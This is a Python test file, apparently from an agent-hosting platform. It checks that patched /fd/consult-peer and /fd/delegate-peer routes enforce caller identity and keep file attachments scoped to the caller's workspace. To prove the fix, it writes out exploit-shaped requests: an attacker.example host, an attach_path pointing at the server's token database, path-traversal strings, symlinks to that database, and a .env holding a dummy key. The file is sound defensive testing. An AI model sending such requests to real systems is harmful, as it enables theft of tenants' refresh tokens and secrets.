"""Peer routes (/fd/consult-peer, /fd/delegate-peer) — caller identity + scoping.

Before: both routes took any caller (even remote, unauthenticated) at its word.
It named a port; FD looked up that agent's web_auth (or used the body's), sent
it to the CALLER-SUPPLIED host, instructed the agent (which acts with its
owner's Google account), and with ``attach_path`` read ANY file FD's OS user
can read — flight-deck.db, with every tenant's refresh token — and POSTed it to
that host.

Now: the caller is a verified bearer (target owner or admin) or an FD-spawned
agent (loopback / X-Agent-Secret + its own X-Agent-Auth) of the target's owner;
the target's host/token come only from FD's records; an attachment is read only
from the calling agent's own workspace, without following symlinks.
"""

from __future__ import annotations

import asyncio
import os
import types
from pathlib import Path

import httpx
import pytest

from captain_claw.flight_deck import server as fd_server
from captain_claw.flight_deck.auth import create_access_token, set_auth_db
from captain_claw.flight_deck.db import FlightDeckDB

LOOPBACK = ("127.0.0.1", 40001)
REMOTE = ("203.0.113.9", 40001)

ALICE_PORT, ALICE_PEER_PORT, BOB_PORT, ORPHAN_PORT = 24101, 24102, 24201, 24301

# The real consult stream, captured before the `deck` fixture fakes it.
_REAL_CONSULT_EVENTS = fd_server._consult_peer_events


def _client(client_addr) -> httpx.AsyncClient:
    return httpx.AsyncClient(
        transport=httpx.ASGITransport(app=fd_server.app, client=client_addr),
        # A host FD answers to by default (origin_guard's Host allowlist).
        base_url="http://localhost:25080")


@pytest.fixture
async def deck(tmp_path: Path, monkeypatch):
    """A deck with two users' process agents (no Docker), a DATA_DIR holding a
    stand-in flight-deck.db, and the consult / upload legs faked out."""
    from captain_claw.flight_deck import auth as fd_auth

    prev = fd_auth._db
    db = FlightDeckDB(tmp_path / "users.db")
    await db.init()
    set_auth_db(db)
    alice = await db.create_user("alice@x.test", "h", "Alice")
    bob = await db.create_user("bob@x.test", "h", "Bob")
    admin = await db.create_user("admin@x.test", "h", "Admin", role="admin")

    data_dir = tmp_path / "fd-data"
    (data_dir / "flight-deck.db").parent.mkdir(parents=True)
    (data_dir / "flight-deck.db").write_bytes(b"SQLite format 3\x00 every tenant's refresh_token")
    registry = {
        "alice-agent": {"web_port": ALICE_PORT, "web_auth": "tok-alice", "owner": alice["id"]},
        "alice-peer": {"web_port": ALICE_PEER_PORT, "web_auth": "tok-alice-peer", "owner": alice["id"]},
        "bob-agent": {"web_port": BOB_PORT, "web_auth": "tok-bob", "owner": bob["id"]},
        "orphan": {"web_port": ORPHAN_PORT, "web_auth": "tok-orphan", "owner": ""},
    }
    for slug in registry:
        (data_dir / slug / "data" / "workspace" / "saved").mkdir(parents=True)

    def _no_docker():
        raise RuntimeError("no docker in tests")

    monkeypatch.setattr(fd_server, "DATA_DIR", data_dir)
    monkeypatch.setattr(fd_server, "_load_process_registry", lambda: registry)
    monkeypatch.setattr(fd_server, "_process_is_alive", lambda slug: True)
    monkeypatch.setattr(fd_server, "get_docker", _no_docker)
    monkeypatch.setenv("FD_AUTH_ENABLED", "true")
    monkeypatch.setenv("FD_AGENT_SHARED_SECRET", "deck-secret")
    monkeypatch.delenv("FD_LOCKDOWN", raising=False)

    consults: list[dict] = []
    uploads: list[dict] = []

    async def fake_consult(host, port, auth, message, **kw):
        consults.append({"host": host, "port": port, "auth": auth, "message": message, **kw})
        yield {"ok": True, "done": True, "response": "pong"}

    async def fake_upload(host, port, auth, filename, blob):
        uploads.append({"host": host, "port": port, "auth": auth, "filename": filename, "blob": blob})
        return [], [f"/target/{filename}"]

    monkeypatch.setattr(fd_server, "_consult_peer_events", fake_consult)
    monkeypatch.setattr(fd_server, "_upload_to_agent", fake_upload)
    try:
        yield types.SimpleNamespace(
            data_dir=data_dir, registry=registry, consults=consults, uploads=uploads,
            alice=alice, bob=bob, admin=admin,
            ws=lambda slug: data_dir / slug / "data" / "workspace")
    finally:
        await db.close()
        fd_auth._db = prev


def _agent(tok: str) -> dict:
    return {"X-Agent-Auth": tok}


def _bearer(user: dict) -> dict:
    return {"Authorization": f"Bearer {create_access_token(user['id'], user.get('role', 'user'))}"}


def _consult_body(port: int, **extra) -> dict:
    return {"port": port, "message": "ping", **extra}


# ── the reported exploit ─────────────────────────────────────────────


async def test_remote_unauthenticated_exfil_is_refused(deck):
    """The probe: name a victim's port, an attacker host, and FD's own DB."""
    body = _consult_body(BOB_PORT, host="attacker.example", auth="",
                         attach_path=str(deck.data_dir / "flight-deck.db"))
    async with _client(REMOTE) as c:
        r = await c.post("/fd/consult-peer", json=body)
        d = await c.post("/fd/delegate-peer", json={
            "target_host": "attacker.example", "target_port": BOB_PORT,
            "source_host": "attacker.example", "source_port": BOB_PORT,
            "message": "x", "attach_path": str(deck.data_dir / "flight-deck.db")})
    assert r.status_code == 403 and d.status_code == 403
    assert deck.consults == [] and deck.uploads == []


async def test_loopback_without_agent_identity_is_refused(deck):
    """Loopback alone (e.g. any web page open on the FD host) proves nothing."""
    async with _client(LOOPBACK) as c:
        r = await c.post("/fd/consult-peer", json=_consult_body(BOB_PORT))
        bad = await c.post("/fd/consult-peer", json=_consult_body(BOB_PORT),
                           headers=_agent("not-a-token-fd-issued"))
    assert r.status_code == 403 and bad.status_code == 403
    assert "X-Agent-Auth" in r.json()["detail"]
    assert deck.consults == []


async def test_remote_secret_without_agent_identity_is_refused(deck):
    async with _client(REMOTE) as c:
        r = await c.post("/fd/consult-peer", json=_consult_body(ALICE_PEER_PORT),
                         headers={"X-Agent-Secret": "deck-secret"})
    assert r.status_code == 403
    assert deck.consults == []


# ── agent callers ────────────────────────────────────────────────────


async def test_agent_consults_own_owners_agent_via_fd_records(deck):
    """Host and token come from FD's records — the body's host/auth are ignored."""
    async with _client(LOOPBACK) as c:
        r = await c.post("/fd/consult-peer", headers=_agent("tok-alice"),
                         json=_consult_body(ALICE_PEER_PORT, host="attacker.example", auth="forged"))
    assert r.status_code == 200
    assert '"response": "pong"' in r.text
    [call] = deck.consults
    assert call["host"] == "localhost"
    assert (call["port"], call["auth"]) == (ALICE_PEER_PORT, "tok-alice-peer")


async def test_consult_streams_from_a_real_peer_with_its_recorded_token(deck, monkeypatch):
    """End to end over a real WebSocket: the moved consult stream still speaks
    the agent protocol, and the peer sees FD's recorded token."""
    import json

    from websockets.asyncio.server import serve

    seen: dict = {}

    async def peer(ws):
        seen["path"] = ws.request.path
        await ws.send(json.dumps({"type": "welcome"}))
        await ws.send(json.dumps({"type": "replay_done"}))
        seen["chat"] = json.loads(await ws.recv())
        await ws.send(json.dumps({"type": "status", "status": "thinking"}))
        await ws.send(json.dumps({"type": "chat_message", "role": "assistant", "content": "pong"}))
        await ws.send(json.dumps({"type": "usage", "model": "m", "total_tokens": 3}))

    monkeypatch.setattr(fd_server, "_consult_peer_events", _REAL_CONSULT_EVENTS)
    async with serve(peer, "127.0.0.1", 0) as server:
        port = server.sockets[0].getsockname()[1]
        deck.registry["alice-live"] = {"web_port": port, "web_auth": "tok-live", "owner": deck.alice["id"]}
        async with _client(LOOPBACK) as c:
            r = await c.post("/fd/consult-peer", headers=_agent("tok-alice"),
                             json=_consult_body(port, auth="forged", no_flow=True))
    lines = [json.loads(x) for x in r.text.splitlines() if x.strip()]
    assert r.status_code == 200
    assert seen["path"] == "/ws?token=tok-live"
    assert seen["chat"] == {"type": "chat", "content": "ping", "no_flow": True,
                            "automation": {"kind": "peer", "job_text": "", "mail_write": "intent"}}
    assert lines[0]["event"] == "status"
    assert lines[-1]["ok"] is True and lines[-1]["response"] == "pong"
    assert lines[-1]["usage"]["total_tokens"] == 3
    assert fd_server._active_consults.get(port) is None  # lock released


async def test_remote_agent_with_secret_and_identity_passes(deck):
    async with _client(REMOTE) as c:
        r = await c.post("/fd/consult-peer", json=_consult_body(ALICE_PEER_PORT),
                         headers={"X-Agent-Secret": "deck-secret", **_agent("tok-alice")})
    assert r.status_code == 200
    assert len(deck.consults) == 1


async def test_agent_cannot_consult_another_users_agent(deck):
    async with _client(LOOPBACK) as c:
        r = await c.post("/fd/consult-peer", json=_consult_body(BOB_PORT), headers=_agent("tok-alice"))
    assert r.status_code == 403
    assert "another user" in r.json()["detail"]
    assert deck.consults == []


async def test_unknown_target_port_is_404(deck):
    """No agent FD knows → no connection anywhere (was: any host:port)."""
    async with _client(LOOPBACK) as c:
        r = await c.post("/fd/consult-peer", json=_consult_body(1), headers=_agent("tok-alice"))
    assert r.status_code == 404
    assert deck.consults == []


async def test_ownerless_agent_is_refused_with_auth_on(deck):
    async with _client(LOOPBACK) as c:
        caller = await c.post("/fd/consult-peer", json=_consult_body(ALICE_PEER_PORT),
                              headers=_agent("tok-orphan"))
        target = await c.post("/fd/consult-peer", json=_consult_body(ORPHAN_PORT),
                              headers=_agent("tok-alice"))
    assert caller.status_code == 403 and target.status_code == 403
    assert deck.consults == []


async def test_auth_disabled_single_user_any_known_agent_may_consult(deck, monkeypatch):
    """No tenant boundary with auth off — but the caller must still be an agent
    this deck spawned (a local web page can't forge X-Agent-Auth)."""
    monkeypatch.setenv("FD_AUTH_ENABLED", "false")
    async with _client(LOOPBACK) as c:
        ok = await c.post("/fd/consult-peer", json=_consult_body(BOB_PORT), headers=_agent("tok-orphan"))
        anon = await c.post("/fd/consult-peer", json=_consult_body(BOB_PORT))
    assert ok.status_code == 200
    assert anon.status_code == 403
    assert len(deck.consults) == 1


# ── bearer callers ───────────────────────────────────────────────────


async def test_bearer_owner_and_admin(deck):
    async with _client(REMOTE) as c:
        own = await c.post("/fd/consult-peer", json=_consult_body(ALICE_PEER_PORT), headers=_bearer(deck.alice))
        other = await c.post("/fd/consult-peer", json=_consult_body(BOB_PORT), headers=_bearer(deck.alice))
        admin = await c.post("/fd/consult-peer", json=_consult_body(BOB_PORT), headers=_bearer(deck.admin))
    assert own.status_code == 200
    assert other.status_code == 403
    assert admin.status_code == 200
    assert [x["port"] for x in deck.consults] == [ALICE_PEER_PORT, BOB_PORT]


async def test_bearer_cannot_borrow_another_users_agent_identity(deck):
    """X-Agent-Auth is what an attachment is read from — it must be the bearer's."""
    async with _client(REMOTE) as c:
        r = await c.post("/fd/consult-peer", json=_consult_body(ALICE_PEER_PORT),
                         headers={**_bearer(deck.alice), **_agent("tok-bob")})
    assert r.status_code == 403
    assert deck.consults == []


async def test_bearer_only_caller_cannot_attach(deck):
    async with _client(REMOTE) as c:
        r = await c.post("/fd/consult-peer", headers=_bearer(deck.alice), json=_consult_body(
            ALICE_PEER_PORT, attach_path=str(deck.ws("alice-peer") / "saved" / "x.txt")))
    assert r.status_code == 400
    assert deck.uploads == [] and deck.consults == []


# ── attachments: the calling agent's own workspace only ──────────────


async def test_attachment_from_own_workspace_is_uploaded_to_target(deck):
    f = deck.ws("alice-agent") / "saved" / "report.pdf"
    f.write_bytes(b"%PDF report")
    async with _client(LOOPBACK) as c:
        r = await c.post("/fd/consult-peer", headers=_agent("tok-alice"),
                         json=_consult_body(ALICE_PEER_PORT, attach_path=str(f)))
    assert r.status_code == 200
    [up] = deck.uploads
    assert (up["host"], up["port"], up["auth"]) == ("localhost", ALICE_PEER_PORT, "tok-alice-peer")
    assert (up["filename"], up["blob"]) == ("report.pdf", b"%PDF report")
    assert deck.consults[0]["file_paths"] == ["/target/report.pdf"]


@pytest.mark.parametrize("attach", [
    "{data}/flight-deck.db",                                  # FD's own DB
    "{data}/alice-agent/.env",                                # outside the workspace
    "{data}/alice-agent/data/workspace/../../../flight-deck.db",  # traversal
    "{data}/bob-agent/data/workspace/saved/x.txt",            # another agent's workspace
    "saved/report.pdf",                                       # relative
])
async def test_attachment_outside_callers_workspace_is_refused(deck, attach):
    (deck.data_dir / "alice-agent" / ".env").write_text("OPENAI_API_KEY=sk-x")
    (deck.ws("bob-agent") / "saved" / "x.txt").write_text("bob's")
    async with _client(LOOPBACK) as c:
        r = await c.post("/fd/consult-peer", headers=_agent("tok-alice"), json=_consult_body(
            ALICE_PEER_PORT, attach_path=attach.format(data=deck.data_dir)))
    assert r.status_code == 403
    assert deck.uploads == [] and deck.consults == []


async def test_attachment_symlinks_are_not_followed(deck):
    """A symlink planted in the workspace (a Docker agent can create one through
    its bind mount) must not point FD's read at the DB — file or directory."""
    ws = deck.ws("alice-agent")
    os.symlink(deck.data_dir / "flight-deck.db", ws / "saved" / "innocent.png")
    os.symlink(deck.data_dir, ws / "saved" / "dir")
    async with _client(LOOPBACK) as c:
        for p in (ws / "saved" / "innocent.png", ws / "saved" / "dir" / "flight-deck.db"):
            r = await c.post("/fd/consult-peer", headers=_agent("tok-alice"),
                             json=_consult_body(ALICE_PEER_PORT, attach_path=str(p)))
            assert r.status_code == 404, p
    assert deck.uploads == [] and deck.consults == []


async def test_attachment_fifo_is_refused_without_hanging(deck):
    fifo = deck.ws("alice-agent") / "saved" / "pipe"
    os.mkfifo(fifo)
    async with _client(LOOPBACK) as c:
        r = await asyncio.wait_for(c.post(
            "/fd/consult-peer", headers=_agent("tok-alice"),
            json=_consult_body(ALICE_PEER_PORT, attach_path=str(fifo))), timeout=10)
    assert r.status_code == 404
    assert deck.uploads == []


async def test_docker_agent_attachment_maps_container_workspace(deck):
    """A Docker agent names files as it sees them (/data/workspace/...); FD
    reads the bind-mounted host copy under DATA_DIR/<container>."""
    ws = deck.data_dir / "cc-docker" / "data" / "workspace" / "saved"
    ws.mkdir(parents=True)
    (ws / "shot.png").write_bytes(b"\x89PNG")
    rec = {"kind": "docker", "slug": "cc-docker", "port": 24401, "auth": "t", "owner": "u"}
    name, blob = await fd_server._read_agent_attachment(rec, "/data/workspace/saved/shot.png")
    assert (name, blob) == ("shot.png", b"\x89PNG")
    with pytest.raises(fd_server.HTTPException) as exc:
        await fd_server._read_agent_attachment(rec, str(ws / "shot.png"))  # host path: not its view
    assert exc.value.status_code == 403


# ── delegate ─────────────────────────────────────────────────────────


class _WsRecorder:
    """Stand-in for websockets.connect: records each URL, then refuses."""

    def __init__(self):
        self.urls: list[str] = []

    def __call__(self, url, **_kw):
        self.urls.append(url)
        return self

    async def __aenter__(self):
        raise ConnectionRefusedError("test")

    async def __aexit__(self, *exc):
        return False


async def _drain_delegations():
    tasks = list(getattr(fd_server.app.state, "_delegate_tasks", set()))
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)


async def test_delegate_result_goes_back_to_the_calling_agent(deck, monkeypatch):
    """The body's source_host/source_port can't redirect the callback (with the
    source's token) to another agent or host."""
    import websockets

    rec = _WsRecorder()
    monkeypatch.setattr(websockets, "connect", rec)
    async with _client(LOOPBACK) as c:
        r = await c.post("/fd/delegate-peer", headers=_agent("tok-alice"), json={
            "target_host": "attacker.example", "target_port": ALICE_PEER_PORT,
            "source_host": "attacker.example", "source_port": BOB_PORT, "message": "go"})
    assert r.status_code == 200 and r.json()["ok"] is True
    await _drain_delegations()
    assert rec.urls == [
        f"ws://localhost:{ALICE_PEER_PORT}/ws?token=tok-alice-peer",  # the task
        f"ws://localhost:{ALICE_PORT}/ws?token=tok-alice",            # the result, to the caller
    ]


async def test_delegate_to_another_users_agent_is_refused(deck, monkeypatch):
    import websockets

    rec = _WsRecorder()
    monkeypatch.setattr(websockets, "connect", rec)
    async with _client(LOOPBACK) as c:
        r = await c.post("/fd/delegate-peer", headers=_agent("tok-alice"), json={
            "target_port": BOB_PORT, "source_port": ALICE_PORT, "message": "go"})
    assert r.status_code == 403
    await _drain_delegations()
    assert rec.urls == []


async def test_delegate_to_self_is_refused_by_recorded_port(deck):
    async with _client(LOOPBACK) as c:
        r = await c.post("/fd/delegate-peer", headers=_agent("tok-alice"), json={
            "target_port": ALICE_PORT, "source_port": ALICE_PEER_PORT, "message": "go"})
    assert r.status_code == 200 and r.json()["ok"] is False


async def test_delegate_bearer_caller_needs_an_owned_source(deck, monkeypatch):
    import websockets

    monkeypatch.setattr(websockets, "connect", _WsRecorder())
    async with _client(REMOTE) as c:
        ok = await c.post("/fd/delegate-peer", headers=_bearer(deck.alice), json={
            "target_port": ALICE_PEER_PORT, "source_port": ALICE_PORT, "message": "go"})
        bad = await c.post("/fd/delegate-peer", headers=_bearer(deck.alice), json={
            "target_port": ALICE_PEER_PORT, "source_port": BOB_PORT, "message": "go"})
    await _drain_delegations()
    assert ok.status_code == 200 and bad.status_code == 403


# ── in-process callers (flow engine) ─────────────────────────────────


async def test_flow_agent_step_uses_the_in_process_consult_seam():
    """The flow engine no longer POSTs to /fd/consult-peer (which now demands
    caller identity): it consults its pool agent in-process."""
    from captain_claw.flight_deck.flow_runner import FlowRunner, _Root

    seen: list[tuple] = []

    async def consult(host, port, auth, message, **kw):
        seen.append((host, port, auth, kw.get("no_flow"), kw.get("no_broadcast")))
        yield {"event": "status", "data": {"status": "working"}}
        yield {"ok": True, "done": True, "response": "described"}

    agent = {"name": "vision", "host": "localhost", "port": 24501, "auth": "tok-v", "status": "running"}
    fr = FlowRunner(store=None, get_agents=lambda: [agent], resolve_auth=lambda p: "",
                    fd_self_base="http://localhost:1", consult_peer=consult)
    root = _Root(run_id="r", control=None, dry=False, budget={"steps_left": 5}, depth_cap=4)
    out, who = await fr._run_agent_step({"prompt": "describe", "on": "name:vision"}, {}, {}, root)
    assert (out, who) == ("described", "vision")
    assert seen == [("localhost", 24501, "tok-v", True, True)]


# ── agent side: identity only to a pinned FD URL ─────────────────────


def _fake_cfg(monkeypatch, *, token="tok-self", secret="cfg-secret", fd_url=""):
    import captain_claw.config as cc_config

    cfg = types.SimpleNamespace(
        web=types.SimpleNamespace(auth_token=token),
        google_oauth=types.SimpleNamespace(flight_deck_secret=secret, flight_deck_url=fd_url))
    monkeypatch.setattr(cc_config, "get_config", lambda: cfg)


def test_identity_headers_only_for_pinned_fd_url(monkeypatch):
    from captain_claw.fd_client import agent_identity_headers

    monkeypatch.setenv("FD_URL", "http://localhost:25080/")
    monkeypatch.delenv("FD_INTERNAL_URL", raising=False)
    _fake_cfg(monkeypatch)
    assert agent_identity_headers("http://localhost:25080") == {
        "X-Agent-Secret": "cfg-secret", "X-Agent-Auth": "tok-self"}
    # A session fd_url a websocket client chose never gets the credentials.
    assert agent_identity_headers("https://attacker.example") == {}
    assert agent_identity_headers("") == {}


async def test_consult_peer_tool_sends_identity_not_peer_token(monkeypatch):
    """The tool talks to the pinned FD (not the session fd_url), identifies
    itself, and no longer forwards a peer's token or host in the body."""
    import json

    from captain_claw.tools.consult_peer import ConsultPeerTool

    monkeypatch.setenv("FD_URL", "http://fd.local:25080")
    monkeypatch.delenv("FD_INTERNAL_URL", raising=False)
    _fake_cfg(monkeypatch)
    captured: list[httpx.Request] = []

    def handler(request: httpx.Request) -> httpx.Response:
        captured.append(request)
        return httpx.Response(200, text=json.dumps({"ok": True, "done": True, "response": "hi"}) + "\n")

    real_client = httpx.AsyncClient
    monkeypatch.setattr(httpx, "AsyncClient",
                        lambda **kw: real_client(transport=httpx.MockTransport(handler), **kw))
    session = types.SimpleNamespace(metadata={
        "fd_url": "https://attacker.example",
        "peer_agents": [{"name": "Peer", "host": "evil.example", "port": 24102, "auth": "peer-token"}]})
    res = await ConsultPeerTool().execute(agent_name="Peer", message="hello", _session=session)
    assert res.success, res.error
    [req] = captured
    assert str(req.url) == "http://fd.local:25080/fd/consult-peer"
    assert req.headers["X-Agent-Auth"] == "tok-self"
    body = json.loads(req.content)
    assert body["port"] == 24102 and "auth" not in body and "host" not in body


# ── automated-turn marker (PR E: no unrequested email) ──────────────


@pytest.mark.parametrize("extra,job_text", [
    ({"mail_intent_text": "draft a reply to Ana"}, "draft a reply to Ana"), ({}, ""),
])
async def test_consult_stamps_the_peer_marker(deck, extra, job_text):
    async with _client(LOOPBACK) as c:
        r = await c.post("/fd/consult-peer", headers=_agent("tok-alice"),
                         json=_consult_body(ALICE_PEER_PORT, **extra))
    assert r.status_code == 200
    [call] = deck.consults
    assert call["automation"] == {"kind": "peer", "job_text": job_text, "mail_write": "intent"}


class _FakeTargetWs:
    """The delegate target's socket: handshake, record the task frame, close."""

    def __init__(self, sent: list):
        self.sent = sent
        self.inbox = [{"type": "welcome"}, {"type": "replay_done"}]

    async def __aenter__(self):
        return self

    async def __aexit__(self, *exc):
        return False

    async def recv(self):
        import json
        if self.inbox:
            return json.dumps(self.inbox.pop(0))
        raise ConnectionError("closed")

    async def send(self, raw):
        import json
        self.sent.append(json.loads(raw))


async def test_delegate_stamps_the_peer_marker(deck, monkeypatch):
    import websockets

    sent: list = []

    def fake_connect(url, **_kw):
        if f":{ALICE_PEER_PORT}/" in url:
            return _FakeTargetWs(sent)
        return _WsRecorder()(url)   # the result leg back to the caller: refused

    monkeypatch.setattr(websockets, "connect", fake_connect)
    async with _client(LOOPBACK) as c:
        r = await c.post("/fd/delegate-peer", headers=_agent("tok-alice"), json={
            "target_port": ALICE_PEER_PORT, "message": "go",
            "mail_intent_text": "draft a reply to Ana"})
    assert r.status_code == 200
    await _drain_delegations()
    [frame] = sent
    assert frame["automation"] == {"kind": "peer", "job_text": "draft a reply to Ana",
                                   "mail_write": "intent"}
